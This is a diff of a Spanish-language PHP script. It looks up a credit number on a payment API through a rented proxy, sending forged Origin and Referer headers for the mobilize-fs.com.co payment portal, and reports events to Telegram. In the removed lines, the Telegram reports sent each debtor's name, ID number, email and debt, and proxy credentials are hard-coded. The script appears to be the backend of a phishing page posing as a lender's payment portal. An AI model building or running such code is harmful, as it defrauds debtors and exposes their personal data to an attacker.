@@ -1,203 +1,582 @@
 <?php
+
 session_start();
+
 require_once __DIR__ . '/includes/telegram-logger.php';
+
 header('Content-Type: application/json; charset=utf-8');
 
-// Configuración (puedes moverlo a un archivo de configuración)
-define('API_URL', 'https://t3a9z73ceg.execute-api.us-east-1.amazonaws.com/prod/paymentez/1111111/oracle/get-user-info');
-define('PROXY_HOST', 'gw.psbproxy.io');
-define('PROXY_PORT', 823);
-define('PROXY_USER', 'a797e8cd41dca9e41cc1__cr.co'); // Ajusta según formato
-define('PROXY_PASS', 'ec775309c591edb9');
-define('USE_PROXY', true); // Cambiar a false si no se quiere usar proxy
+/*
+|--------------------------------------------------------------------------
+| CONFIGURACIÓN
+|--------------------------------------------------------------------------
+*/
 
-// Función para escribir logs (mejorada)
-function writeApiDebugLog(array $context): void
+define(
+    'API_URL',
+    'https://t3a9z73ceg.execute-api.us-east-1.amazonaws.com/prod/paymentez/1111111/oracle/get-user-info'
+);
+
+define('PROXY_HOST', getenv('PROXY_HOST') ?: 'gw.psbproxy.io');
+define('PROXY_PORT', getenv('PROXY_PORT') ?: 823);
+define('PROXY_USER', getenv('PROXY_USER') ?: '');
+define('PROXY_PASS', getenv('PROXY_PASS') ?: '');
+
+define('USE_PROXY', true);
+
+
+/*
+|--------------------------------------------------------------------------
+| LOG A TXT
+|--------------------------------------------------------------------------
+*/
+
+function writeApiDebugLog(string $message, array $context = []): void
 {
     $logDir = __DIR__ . '/logs';
-    $logFile = $logDir . '/api-debug.json'; // Usar JSON para estructura
 
     if (!is_dir($logDir)) {
         @mkdir($logDir, 0775, true);
     }
 
-    $logEntry = array_merge([
-        'timestamp' => date('Y-m-d H:i:s'),
-        'session_id' => session_id(),
-    ], $context);
+    $logFile = $logDir . '/api-debug.txt';
 
-    // Evitar exponer datos sensibles en logs (opcional)
-    if (isset($logEntry['payload'])) {
-        // Podrías ocultar partes del payload si es necesario
+    $timestamp = date('Y-m-d H:i:s');
+
+    $line = "\n";
+    $line .= "============================================================\n";
+    $line .= "[$timestamp] $message\n";
+
+    if (!empty($context)) {
+        foreach ($context as $key => $value) {
+
+            // Evitar valores demasiado grandes
+            if (is_array($value)) {
+                $value = json_encode(
+                    $value,
+                    JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES
+                );
+            }
+
+            $line .= "$key: $value\n";
+        }
     }
 
-    file_put_contents($logFile, json_encode($logEntry) . PHP_EOL, FILE_APPEND | LOCK_EX);
+    $line .= "============================================================\n";
+
+    file_put_contents(
+        $logFile,
+        $line,
+        FILE_APPEND | LOCK_EX
+    );
 }
 
-// Función para log a Telegram con contexto
+
+/*
+|--------------------------------------------------------------------------
+| TELEGRAM
+|--------------------------------------------------------------------------
+*/
+
 function logTelegram($action, $data = [])
 {
-    // Asumiendo que telegram_log está definida en el include
     if (function_exists('telegram_log')) {
         telegram_log($action, $data);
     }
 }
 
-// Validar método y parámetros
-if ($_SERVER['REQUEST_METHOD'] !== 'POST' || empty($_POST['creditNumber'])) {
+
+/*
+|--------------------------------------------------------------------------
+| VALIDACIÓN
+|--------------------------------------------------------------------------
+*/
+
+if (
+    $_SERVER['REQUEST_METHOD'] !== 'POST' ||
+    empty($_POST['creditNumber'])
+) {
+    writeApiDebugLog('PETICIÓN RECHAZADA', [
+        'method' => $_SERVER['REQUEST_METHOD'] ?? 'unknown',
+        'reason' => 'creditNumber vacío'
+    ]);
+
     http_response_code(400);
-    echo json_encode(['success' => false, 'message' => 'Debes ingresar el número de crédito.']);
+
+    echo json_encode([
+        'success' => false,
+        'message' => 'Debes ingresar el número de crédito.'
+    ]);
+
     exit;
 }
 
 $creditNumber = trim($_POST['creditNumber']);
 
-// Validación más estricta: solo alfanumérico y guiones, longitud 1-30
 if (!preg_match('/^[A-Za-z0-9\-]{1,30}$/', $creditNumber)) {
+
+    writeApiDebugLog('CREDIT NUMBER INVÁLIDO', [
+        'length' => strlen($creditNumber)
+    ]);
+
     http_response_code(422);
-    echo json_encode(['success' => false, 'message' => 'El número de crédito ingresado no es válido.']);
+
+    echo json_encode([
+        'success' => false,
+        'message' => 'El número de crédito ingresado no es válido.'
+    ]);
+
     exit;
 }
 
-// Log inicio
-logTelegram('🔎 Búsqueda de crédito', [
-    'Número de crédito' => $creditNumber,
-    'IP' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
+
+/*
+|--------------------------------------------------------------------------
+| LOG INICIAL
+|--------------------------------------------------------------------------
+*/
+
+writeApiDebugLog('INICIO DE PETICIÓN', [
+    'php_version' => PHP_VERSION,
+    'curl_version' => function_exists('curl_version')
+        ? curl_version()['version']
+        : 'NO DISPONIBLE',
+    'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
+    'request_method' => $_SERVER['REQUEST_METHOD'] ?? 'unknown',
+    'remote_ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
+    'api_host' => parse_url(API_URL, PHP_URL_HOST),
+    'proxy_enabled' => USE_PROXY ? 'SI' : 'NO',
+    'proxy_host' => PROXY_HOST,
+    'proxy_port' => PROXY_PORT,
+    'proxy_user_configured' => PROXY_USER !== '' ? 'SI' : 'NO',
 ]);
 
-// Preparar payload
+
+/*
+|--------------------------------------------------------------------------
+| PAYLOAD
+|--------------------------------------------------------------------------
+*/
+
 $payload = json_encode([
     'creditNumber' => $creditNumber,
     'forceRequest' => true,
     'chanel' => 'test'
 ]);
 
-// Configurar cURL
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, API_URL);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_POST, true);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
-curl_setopt($ch, CURLOPT_HTTPHEADER, [
-    'Content-Type: application/json',
-    'Origin: https://www.mobilize-fs.com.co',
-    'Referer: https://www.mobilize-fs.com.co/portal-pagos/',
-]);
-curl_setopt($ch, CURLOPT_TIMEOUT, 15);
-curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); // Añadido
+if ($payload === false) {
 
-// Configurar proxy si está habilitado
-if (USE_PROXY && defined('PROXY_HOST')) {
-    curl_setopt($ch, CURLOPT_PROXY, PROXY_HOST . ':' . PROXY_PORT);
-    if (defined('PROXY_USER') && defined('PROXY_PASS')) {
-        curl_setopt($ch, CURLOPT_PROXYUSERPWD, PROXY_USER . ':' . PROXY_PASS);
-    }
-    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP); // o CURLPROXY_SOCKS5 según necesites
-}
-
-// Ejecutar
-$response = curl_exec($ch);
-$errno = curl_errno($ch);
-$error = curl_error($ch);
-$httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
-curl_close($ch);
-
-// Log detallado (sin exponer credenciales)
-writeApiDebugLog([
-    'step' => 'api_call',
-    'creditNumber' => $creditNumber,
-    'httpCode' => $httpCode,
-    'curlErrno' => $errno,
-    'curlError' => $error ?: 'ninguno',
-    'responseLength' => strlen($response),
-    'proxy_used' => USE_PROXY ? PROXY_HOST . ':' . PROXY_PORT : 'no',
-]);
-
-// Manejar error de cURL
-if ($errno || $response === false) {
-    logTelegram('❌ Error de conexión con la API', [
-        'Número de crédito' => $creditNumber,
-        'Error cURL' => curl_strerror($errno) ?: 'sin respuesta',
-        'HTTP Code' => $httpCode,
+    writeApiDebugLog('ERROR CREANDO PAYLOAD', [
+        'json_error' => json_last_error_msg()
     ]);
-    http_response_code(502);
-    echo json_encode(['success' => false, 'message' => 'Error de conexión con el servicio.']);
+
+    http_response_code(500);
+
+    echo json_encode([
+        'success' => false,
+        'message' => 'Error preparando la petición.'
+    ]);
+
     exit;
 }
 
-// Decodificar respuesta
+
+/*
+|--------------------------------------------------------------------------
+| CURL
+|--------------------------------------------------------------------------
+*/
+
+$ch = curl_init();
+
+curl_setopt_array($ch, [
+
+    CURLOPT_URL => API_URL,
+
+    CURLOPT_RETURNTRANSFER => true,
+
+    CURLOPT_POST => true,
+
+    CURLOPT_POSTFIELDS => $payload,
+
+    CURLOPT_HTTPHEADER => [
+        'Content-Type: application/json',
+        'Origin: https://www.mobilize-fs.com.co',
+        'Referer: https://www.mobilize-fs.com.co/portal-pagos/',
+        'Accept: application/json',
+        'User-Agent: Mozilla/5.0'
+    ],
+
+    CURLOPT_TIMEOUT => 30,
+
+    CURLOPT_CONNECTTIMEOUT => 15,
+
+    /*
+     * IMPORTANTE:
+     * Nos permite diagnosticar problemas de SSL/DNS/conexión.
+     */
+    CURLOPT_VERBOSE => true,
+
+    /*
+     * Forzar IPv4 puede ayudar si Railway/proxy tiene
+     * problemas con IPv6.
+     */
+    CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
+
+]);
+
+
+/*
+|--------------------------------------------------------------------------
+| CONFIGURAR PROXY
+|--------------------------------------------------------------------------
+*/
+
+if (USE_PROXY) {
+
+    curl_setopt($ch, CURLOPT_PROXY, PROXY_HOST);
+    curl_setopt($ch, CURLOPT_PROXYPORT, PROXY_PORT);
+
+    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+
+    if (PROXY_USER !== '' && PROXY_PASS !== '') {
+
+        curl_setopt(
+            $ch,
+            CURLOPT_PROXYUSERPWD,
+            PROXY_USER . ':' . PROXY_PASS
+        );
+    }
+
+    writeApiDebugLog('PROXY CONFIGURADO', [
+        'host' => PROXY_HOST,
+        'port' => PROXY_PORT,
+        'type' => 'HTTP',
+        'credentials' => (
+            PROXY_USER !== '' && PROXY_PASS !== ''
+                ? 'CONFIGURADAS'
+                : 'NO CONFIGURADAS'
+        )
+    ]);
+
+} else {
+
+    writeApiDebugLog('PETICIÓN SIN PROXY');
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| EJECUTAR
+|--------------------------------------------------------------------------
+*/
+
+$startTime = microtime(true);
+
+$response = curl_exec($ch);
+
+$duration = round(
+    (microtime(true) - $startTime) * 1000,
+    2
+);
+
+
+/*
+|--------------------------------------------------------------------------
+| INFORMACIÓN CURL
+|--------------------------------------------------------------------------
+*/
+
+$errno = curl_errno($ch);
+
+$error = curl_error($ch);
+
+$info = curl_getinfo($ch);
+
+$httpCode = (int) ($info['http_code'] ?? 0);
+
+
+/*
+|--------------------------------------------------------------------------
+| LOG DETALLADO
+|--------------------------------------------------------------------------
+*/
+
+writeApiDebugLog('CURL TERMINÓ', [
+
+    'duration_ms' => $duration,
+
+    'curl_errno' => $errno,
+
+    'curl_error' => $error ?: 'NINGUNO',
+
+    'http_code' => $httpCode,
+
+    'response_size' => (
+        $response !== false
+            ? strlen($response)
+            : 0
+    ),
+
+    'namelookup_time' => $info['namelookup_time'] ?? null,
+
+    'connect_time' => $info['connect_time'] ?? null,
+
+    'pretransfer_time' => $info['pretransfer_time'] ?? null,
+
+    'starttransfer_time' => $info['starttransfer_time'] ?? null,
+
+    'total_time' => $info['total_time'] ?? null,
+
+    'primary_ip' => $info['primary_ip'] ?? null,
+
+    'local_ip' => $info['local_ip'] ?? null,
+
+    'primary_port' => $info['primary_port'] ?? null,
+
+    'local_port' => $info['local_port'] ?? null,
+
+    'redirect_count' => $info['redirect_count'] ?? null,
+
+    'content_type' => $info['content_type'] ?? null,
+
+    'download_content_length' =>
+        $info['download_content_length'] ?? null,
+
+]);
+
+
+/*
+|--------------------------------------------------------------------------
+| RESPUESTA DE LA API
+|--------------------------------------------------------------------------
+*/
+
+if ($response !== false) {
+
+    /*
+     * NO guardar toda la respuesta.
+     * Solamente una muestra para diagnóstico.
+     */
+    writeApiDebugLog('RESPUESTA API - MUESTRA', [
+
+        'first_500_chars' =>
+            substr($response, 0, 500)
+
+    ]);
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| CERRAR CURL
+|--------------------------------------------------------------------------
+*/
+
+curl_close($ch);
+
+
+/*
+|--------------------------------------------------------------------------
+| ERROR CURL
+|--------------------------------------------------------------------------
+*/
+
+if ($errno || $response === false) {
+
+    writeApiDebugLog('ERROR CURL', [
+
+        'errno' => $errno,
+
+        'error' => $error,
+
+        'error_description' =>
+            function_exists('curl_strerror')
+                ? curl_strerror($errno)
+                : 'No disponible',
+
+        'http_code' => $httpCode,
+
+    ]);
+
+    logTelegram('❌ Error de conexión con la API', [
+
+        'Error cURL' => $error ?: curl_strerror($errno),
+
+        'HTTP Code' => $httpCode,
+
+    ]);
+
+    http_response_code(502);
+
+    echo json_encode([
+        'success' => false,
+        'message' => 'Error de conexión con el servicio.'
+    ]);
+
+    exit;
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| HTTP NO EXITOSO
+|--------------------------------------------------------------------------
+*/
+
+if ($httpCode < 200 || $httpCode >= 300) {
+
+    writeApiDebugLog('API RESPONDIÓ CON HTTP NO EXITOSO', [
+
+        'http_code' => $httpCode,
+
+        'response_sample' =>
+            substr($response, 0, 1000)
+
+    ]);
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| JSON
+|--------------------------------------------------------------------------
+*/
+
 $data = json_decode($response, true);
+
 $jsonError = json_last_error_msg();
 
 if ($data === null && $jsonError !== 'No error') {
-    // JSON inválido
-    writeApiDebugLog([
-        'step' => 'json_error',
-        'creditNumber' => $creditNumber,
-        'jsonError' => $jsonError,
-        'rawResponse' => substr($response, 0, 500), // solo una parte para evitar logs enormes
+
+    writeApiDebugLog('ERROR DECODIFICANDO JSON', [
+
+        'json_error' => $jsonError,
+
+        'response_sample' =>
+            substr($response, 0, 1000)
+
     ]);
+
     logTelegram('⚠️ Respuesta JSON inválida', [
-        'Número de crédito' => $creditNumber,
         'Error' => $jsonError,
     ]);
+
     http_response_code(500);
-    echo json_encode(['success' => false, 'message' => 'La respuesta del servicio no es válida.']);
+
+    echo json_encode([
+        'success' => false,
+        'message' => 'La respuesta del servicio no es válida.'
+    ]);
+
     exit;
 }
 
-// Verificar si existe userInfo
-if (isset($data['userInfo']) && is_array($data['userInfo'])) {
+
+/*
+|--------------------------------------------------------------------------
+| USER INFO
+|--------------------------------------------------------------------------
+*/
+
+if (
+    isset($data['userInfo']) &&
+    is_array($data['userInfo'])
+) {
+
     $userInfo = $data['userInfo'];
-    $concept = $data['paymentDescription'] ?? 'Pago credito RCI';
-    $minPayment = $userInfo['PAGO_MINIMO'] ?? null;
-    $totalDebt = $userInfo['PAGO_TOTAL'] ?? null;
-    $dueDate = $userInfo['FECHA_VENCIMIENTO_PAGO'] ?? null;
+
+    $concept =
+        $data['paymentDescription']
+        ?? 'Pago credito RCI';
+
+    $minPayment =
+        $userInfo['PAGO_MINIMO']
+        ?? null;
+
+    $totalDebt =
+        $userInfo['PAGO_TOTAL']
+        ?? null;
+
+    $dueDate =
+        $userInfo['FECHA_VENCIMIENTO_PAGO']
+        ?? null;
+
     $valueToPay = $minPayment;
 
-    // Guardar en sesión
+
+    /*
+     * Sesión
+     */
+
     $_SESSION['userInfo'] = $userInfo;
+
     $_SESSION['creditNumber'] = $creditNumber;
+
     $_SESSION['payment'] = [
+
         'concept' => $concept,
+
         'minPayment' => $minPayment,
+
         'totalDebt' => $totalDebt,
+
         'dueDate' => $dueDate,
+
         'valueToPay' => $valueToPay,
+
     ];
 
-    logTelegram('✅ Crédito encontrado', [
-        'Número de crédito' => $creditNumber,
-        'Nombre' => $userInfo['NOMBRE_COMPLETO'] ?? null,
-        'Documento' => $userInfo['UNIQUE_ID_VALUE'] ?? null,
-        'Correo' => $userInfo['EMAIL'] ?? null,
-        'Pago mínimo' => $minPayment,
-        'Deuda total' => $totalDebt,
-        'Vencimiento' => $dueDate,
+
+    writeApiDebugLog('API RESPONDIÓ CORRECTAMENTE', [
+
+        'http_code' => $httpCode,
+
+        'has_userInfo' => 'SI',
+
+        'has_paymentDescription' =>
+            isset($data['paymentDescription'])
+                ? 'SI'
+                : 'NO',
+
     ]);
+
 
     echo json_encode([
         'success' => true,
         'redirect' => 'detalle-pago.php'
     ]);
+
     exit;
 }
 
-// Si no se encontró userInfo
-writeApiDebugLog([
-    'step' => 'credit_not_found',
-    'creditNumber' => $creditNumber,
-    'httpCode' => $httpCode,
-    'responseMessage' => $data['message'] ?? 'Sin userInfo en respuesta',
-    'decoded' => $data,
+
+/*
+|--------------------------------------------------------------------------
+| SIN USER INFO
+|--------------------------------------------------------------------------
+*/
+
+writeApiDebugLog('API RESPONDIÓ PERO SIN USERINFO', [
+
+    'http_code' => $httpCode,
+
+    'message' =>
+        $data['message']
+        ?? 'Sin mensaje',
+
+    'response_sample' =>
+        substr($response, 0, 1000)
+
 ]);
 
-logTelegram('⚠️ Crédito no encontrado', [
-    'Número de crédito' => $creditNumber,
-]);
 
-http_response_code(404); // o 200 pero con success false
+logTelegram('⚠️ Crédito no encontrado', []);
+
+http_response_code(404);
+
 echo json_encode([
     'success' => false,
-    'message' => 'No encontramos información asociada a ese número de crédito.'
+    'message' =>
+        'No encontramos información asociada a ese número de crédito.'
 ]);
